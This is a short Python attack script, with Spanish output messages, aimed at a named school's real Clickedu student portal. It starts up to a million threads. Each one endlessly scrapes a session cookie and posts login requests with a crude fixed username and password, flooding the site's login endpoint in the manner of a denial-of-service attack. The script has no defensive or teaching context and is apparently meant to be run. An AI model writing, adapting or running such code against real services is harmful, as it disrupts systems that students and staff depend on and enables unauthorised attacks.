#!/usr/bin/python3
import requests, re, threading, time


def main():
    print("[+] Creando hilos...")
    print("Tienes exactamente 5 segundos para abortar.")
    time.sleep(5)

    number = 0
    while True:
        threads=[]
        for i in range(1000000):
            number+=1
            thread=threading.Thread(target=request,args=[number])
            thread.start()
            threads=[] # threads being reset here!
            threads.append(thread)
        for thread in threads:
            thread.join()



def request(num):
    try:
        username = "chupameel"

        line = "pene" 
        while True:
        ## Obtener el PHPSESSID
            url1 = "https://escolarosaliadecastro.clickedu.eu/students/la_meva_classe.php"
            r1 = str(requests.get(url1).cookies)
            PHPSESSID = re.search(r"PHPSESSID=\w*", r1).group().split("=")[1]

        ## Hacer la POST request
            url2 = "https://escolarosaliadecastro.clickedu.eu/user.php?action=doLogin"
            cookies = { "cookiescheck": "true", "PHPSESSID": PHPSESSID }
            post_data = { "username": username, "password": line, "button": "Inicia" }

            r2 = requests.post(url2, cookies=cookies, data=post_data).text

            print(f"El hilo {num} ha finalizado una request.")
    except:
        print("[+] Baneado!!")

if __name__ == "__main__":
    main()
